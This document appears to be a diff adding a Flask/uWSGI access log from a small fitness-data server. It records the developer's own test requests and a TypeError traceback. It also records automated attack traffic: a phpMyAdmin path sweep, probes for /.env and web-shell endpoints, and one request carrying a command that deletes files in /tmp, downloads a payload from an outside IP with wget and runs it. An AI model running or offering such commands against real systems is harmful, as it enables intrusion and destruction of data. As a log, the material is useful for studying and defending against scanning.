+[pid: 12631|app: 0|req: 39/93] 136.49.50.109 () {32 vars in 498 bytes} [Sun Oct 22 12:09:41 2023] GET /mysqladmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 55/94] 136.49.50.109 () {32 vars in 500 bytes} [Sun Oct 22 12:09:41 2023] GET /1phpmyadmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 40/95] 136.49.50.109 () {32 vars in 496 bytes} [Sun Oct 22 12:09:41 2023] GET /mysql/pMA/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 56/96] 136.49.50.109 () {32 vars in 510 bytes} [Sun Oct 22 12:09:41 2023] GET /phpMyAdmin-5.3.0/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 41/97] 136.49.50.109 () {32 vars in 500 bytes} [Sun Oct 22 12:09:41 2023] GET /php-myadmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 42/98] 136.49.50.109 () {32 vars in 490 bytes} [Sun Oct 22 12:09:41 2023] GET /shopdb/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 57/99] 136.49.50.109 () {32 vars in 498 bytes} [Sun Oct 22 12:09:41 2023] GET /db/myadmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 58/100] 136.49.50.109 () {32 vars in 508 bytes} [Sun Oct 22 12:09:41 2023] GET /db/phpMyAdmin-3/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 43/101] 136.49.50.109 () {32 vars in 508 bytes} [Sun Oct 22 12:09:41 2023] GET /db/phpMyAdmin-4/index.php?lang=en => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 59/102] 136.49.50.109 () {32 vars in 506 bytes} [Sun Oct 22 12:09:41 2023] GET /db/phpmyadmin4/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 60/103] 136.49.50.109 () {32 vars in 506 bytes} [Sun Oct 22 12:09:41 2023] GET /sql/phpmanager/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 44/104] 136.49.50.109 () {32 vars in 498 bytes} [Sun Oct 22 12:09:41 2023] GET /phpmyadmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (2 switches on core 0)
+[pid: 12632|app: 0|req: 61/105] 136.49.50.109 () {32 vars in 492 bytes} [Sun Oct 22 12:09:41 2023] GET /dbadmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 62/106] 136.49.50.109 () {32 vars in 498 bytes} [Sun Oct 22 12:09:41 2023] GET /sql/websql/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 63/107] 136.49.50.109 () {32 vars in 506 bytes} [Sun Oct 22 12:09:41 2023] GET /db/phpMyAdmin3/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 45/108] 136.49.50.109 () {32 vars in 504 bytes} [Sun Oct 22 12:09:41 2023] GET /sql/sql-admin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 46/109] 136.49.50.109 () {32 vars in 500 bytes} [Sun Oct 22 12:09:41 2023] GET /phpmyadmin4/index.php?lang=en => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 64/110] 136.49.50.109 () {32 vars in 526 bytes} [Sun Oct 22 12:09:41 2023] GET /administrator/phpMyAdmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 47/111] 136.49.50.109 () {32 vars in 500 bytes} [Sun Oct 22 12:09:42 2023] GET /mysql-admin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 65/112] 136.49.50.109 () {32 vars in 502 bytes} [Sun Oct 22 12:09:42 2023] GET /sql/webadmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 48/113] 136.49.50.109 () {32 vars in 506 bytes} [Sun Oct 22 12:09:42 2023] GET /phpmyadmin2022/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 66/114] 136.49.50.109 () {32 vars in 506 bytes} [Sun Oct 22 12:09:42 2023] GET /sql/phpMyAdmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 49/115] 136.49.50.109 () {32 vars in 504 bytes} [Sun Oct 22 12:09:42 2023] GET /mysql/dbadmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 50/116] 136.49.50.109 () {32 vars in 504 bytes} [Sun Oct 22 12:09:42 2023] GET /db/phpMyAdmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 67/117] 136.49.50.109 () {32 vars in 502 bytes} [Sun Oct 22 12:09:42 2023] GET /php-my-admin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 68/118] 136.49.50.109 () {32 vars in 500 bytes} [Sun Oct 22 12:09:42 2023] GET /_phpmyadmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 51/119] 136.49.50.109 () {32 vars in 506 bytes} [Sun Oct 22 12:09:42 2023] GET /db/phpmyadmin3/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 52/120] 136.49.50.109 () {32 vars in 538 bytes} [Sun Oct 22 12:09:42 2023] GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 69/121] 136.49.50.109 () {32 vars in 540 bytes} [Sun Oct 22 12:09:42 2023] GET /phpMyAdmin-latest-all-languages/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 70/122] 136.49.50.109 () {32 vars in 492 bytes} [Sun Oct 22 12:09:42 2023] GET /myadmin/index.php?lang=en => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 53/123] 136.49.50.109 () {32 vars in 484 bytes} [Sun Oct 22 12:09:42 2023] GET /PMA/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 54/124] 136.49.50.109 () {32 vars in 540 bytes} [Sun Oct 22 12:09:42 2023] GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 71/125] 136.49.50.109 () {32 vars in 496 bytes} [Sun Oct 22 12:09:42 2023] GET /admin/pma/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 72/126] 136.49.50.109 () {32 vars in 498 bytes} [Sun Oct 22 12:09:42 2023] GET /phpMyAdmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 73/127] 136.49.50.109 () {32 vars in 506 bytes} [Sun Oct 22 12:09:42 2023] GET /phpmyadmin2016/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 55/128] 136.49.50.109 () {32 vars in 498 bytes} [Sun Oct 22 12:09:42 2023] GET /phpmyAdmin/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 74/129] 136.49.50.109 () {32 vars in 502 bytes} [Sun Oct 22 12:09:42 2023] GET /phpMyAdmin-4/index.php?lang=en => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+True
+{'energy': 531, 'heartRate': 130, 'distance': 3.2, 'name': 'test'}
+[pid: 12632|app: 0|req: 75/130] 220.116.52.243 () {46 vars in 647 bytes} [Sun Oct 22 12:13:08 2023] POST /getjson => generated 82 bytes in 383 msecs (HTTP/1.1 200) 2 headers in 71 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 76/131] 220.116.52.243 () {40 vars in 649 bytes} [Sun Oct 22 12:15:13 2023] GET /hello => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[2023-10-22 12:16:05,871] ERROR in app: Exception on /json [POST]
+Traceback (most recent call last):
+  File "/home/junyeong96/miniconda3/envs/server/lib/python3.10/site-packages/flask/app.py", line 2525, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/junyeong96/miniconda3/envs/server/lib/python3.10/site-packages/flask/app.py", line 1822, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/junyeong96/miniconda3/envs/server/lib/python3.10/site-packages/flask/app.py", line 1820, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/junyeong96/miniconda3/envs/server/lib/python3.10/site-packages/flask/app.py", line 1796, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/junyeong96/hittimer-server/./Server.py", line 41, in Json
+    params = request.json()
+TypeError: 'dict' object is not callable
+[pid: 12632|app: 0|req: 77/132] 220.116.52.243 () {46 vars in 641 bytes} [Sun Oct 22 12:16:05 2023] POST /json => generated 265 bytes in 9 msecs (HTTP/1.1 500) 2 headers in 99 bytes (1 switches on core 0)
+True
+{'heartRate': 130, 'distance': 3.2, 'energy': 531, 'name': 'test'}
+[pid: 12632|app: 0|req: 78/133] 220.116.52.243 () {46 vars in 647 bytes} [Sun Oct 22 12:16:35 2023] POST /getjson => generated 82 bytes in 362 msecs (HTTP/1.1 200) 2 headers in 71 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 79/134] 220.116.52.243 () {40 vars in 639 bytes} [Sun Oct 22 12:16:48 2023] GET / => generated 10 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 79 bytes (1 switches on core 0)
+[pid: 12632|app: 0|req: 80/135] 220.116.52.243 () {40 vars in 647 bytes} [Sun Oct 22 12:16:49 2023] GET /meet => generated 16 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 79 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 56/136] 207.167.66.222 () {28 vars in 289 bytes} [Sun Oct 22 12:24:53 2023] GET / => generated 10 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 79 bytes (2 switches on core 0)
+[pid: 12632|app: 0|req: 81/137] 139.59.101.104 () {34 vars in 403 bytes} [Sun Oct 22 12:40:13 2023] GET /cdn-cgi/trace => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (2 switches on core 0)
+[pid: 12631|app: 0|req: 57/138] 111.47.230.65 () {36 vars in 525 bytes} [Sun Oct 22 12:49:03 2023] GET / => generated 10 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 79 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 58/139] 184.105.247.196 () {34 vars in 480 bytes} [Sun Oct 22 13:09:52 2023] GET / => generated 10 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 79 bytes (2 switches on core 0)
+[pid: 12632|app: 0|req: 82/140] 184.105.247.196 () {34 vars in 478 bytes} [Sun Oct 22 13:11:08 2023] GET /webui/ => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (2 switches on core 0)
+[pid: 12632|app: 0|req: 83/141] 184.105.247.196 () {34 vars in 480 bytes} [Sun Oct 22 13:12:12 2023] GET /favicon.ico => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (2 switches on core 0)
+[pid: 12632|app: 0|req: 84/142] 184.105.247.196 () {34 vars in 509 bytes} [Sun Oct 22 13:13:42 2023] GET /geoserver/web/ => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (2 switches on core 0)
+[pid: 12632|app: 0|req: 85/143] 45.142.182.77 () {28 vars in 288 bytes} [Sun Oct 22 13:19:50 2023] GET / => generated 10 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 79 bytes (1 switches on core 0)
+[pid: 12631|app: 0|req: 59/144] 109.237.98.226 () {36 vars in 502 bytes} [Sun Oct 22 13:27:50 2023] GET /.env => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (2 switches on core 0)
+[pid: 12632|app: 0|req: 86/145] 35.195.93.98 () {42 vars in 540 bytes} [Sun Oct 22 13:34:21 2023] GET / => generated 10 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 79 bytes (2 switches on core 0)
+[pid: 12632|app: 0|req: 87/146] 197.52.32.186 () {34 vars in 552 bytes} [Sun Oct 22 14:03:18 2023] GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (2 switches on core 0)
+[pid: 12632|app: 0|req: 88/147] 45.142.182.101 () {28 vars in 289 bytes} [Sun Oct 22 14:15:45 2023] GET / => generated 10 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 79 bytes (2 switches on core 0)
+[pid: 12631|app: 0|req: 60/148] 45.142.182.101 () {40 vars in 553 bytes} [Sun Oct 22 14:15:48 2023] POST /web_shell_cmd.gch => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
